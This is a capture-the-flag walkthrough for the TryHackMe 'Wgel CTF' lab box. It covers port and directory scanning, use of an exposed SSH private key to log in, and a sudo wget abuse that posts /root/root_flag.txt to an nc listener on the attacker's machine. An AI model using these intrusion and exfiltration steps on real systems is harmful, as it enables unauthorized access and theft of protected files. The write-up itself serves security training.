# [Wgel CTF](https://tryhackme.com/room/wgelctf)

## Can you exfiltrate the root flag?

# Wgel CTF

## Have fun with this easy box.

### User flag

1. First, identify open ports and running services

```bash
nmap IP
```

[SCREEN01]

2. When visiting the web server at `http://<TARGET_IP>:80`, we find a default Apache2 welcome page. However, examining the HTML source code reveals comment containing the name **"Jessie"**

[SCREEN02]

3. Scan for hidden directories on the web server
   - We found `/sitemap` directory

[SCREEN03]

```bash
gobuster dir -u http://IP -w /root/Tools/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,txt,js
```

4. Scan newly discovered directory `/sitemap`
   - This reveals `.ssh` directory

```bash
gobuster dir -u http://IP/sitemap -w /root/Tools/wordlists/SecLists/Discovery/Web-Content/common.txt
```

[SCREEN05]

5. Navigating to `http://<TARGET_IP>/sitemap/.ssh/id_rsa`, we find an exposed private SSH key
   - Set appropriate permissions for the SSH key

```bash
chmod 600 id_rsa
```

6. Access SSH using the previously discovered username **Jessie** and the SSH key to locate the user flag

```bash
ssh -i id_rsa jessie@IP
cd Documents/
cat user_flag.txt
```

[SCREEN06]

### Root flag

1. Check what commands the current user can execute with sudo privileges

```bash
sudo -l
```

[SCREEN07]

2. Since `wget` can be executed with root privileges, we can use it to read files that only root has access to and exfiltrate them to our attack machine
   - Start a listener on attack machine
   - On the target machine, use wget with sudo to POST the contents of the root flag to listener

```bash
nc -lvnp 4444
```

```bash
sudo /usr/bin/wget --post-file=/root/root_flag.txt http://IP:4444
```

[SCREEN08]
[SCREEN09]
